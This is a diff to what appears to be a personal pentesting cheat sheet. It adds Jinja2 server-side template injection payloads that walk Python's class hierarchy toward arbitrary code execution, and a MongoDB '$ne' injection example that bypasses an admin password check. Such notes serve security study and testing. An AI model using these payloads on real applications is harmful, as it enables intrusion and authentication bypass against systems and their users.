@@ -1,6 +1,20 @@
-Server-side template injection (SSTI)
+Server-side template injection (SSTI):
 
 Python (Flask):
 {{ 7 * 7 }} (for discovery)
-https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti (for enumeration)
+{{ ''.__class__.__mro__ }}  (go to parent classes of string object)
+{{ ''.__class__.__subclasses__ }}  (go to child classes of string object)
+{{ ''.__class__.__mro__[1].__mro__[0].__subclasses__() }}  (output all class functions in Python environment)
+{{ ''.__class__.__mro__[1].__mro__[0].__subclasses__()[<index of class function>](<args>) }}  (execute arbitrary class function)
+Resources:
+https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti (for additional queries)
 https://github.com/epinna/tplmap.git (tplmap SSTLI tool)
+
+NoSQL Injection:
+
+MongoDB (BSON):
+{$ne: <val>} - get all contents of collection where content != val
+ex)
+data = '{"username": "admin", "password": {"$ne": 1}}'
+https://docs.mongodb.com/manual/reference/operator/query-comparison/
+(for all comparison query operators)
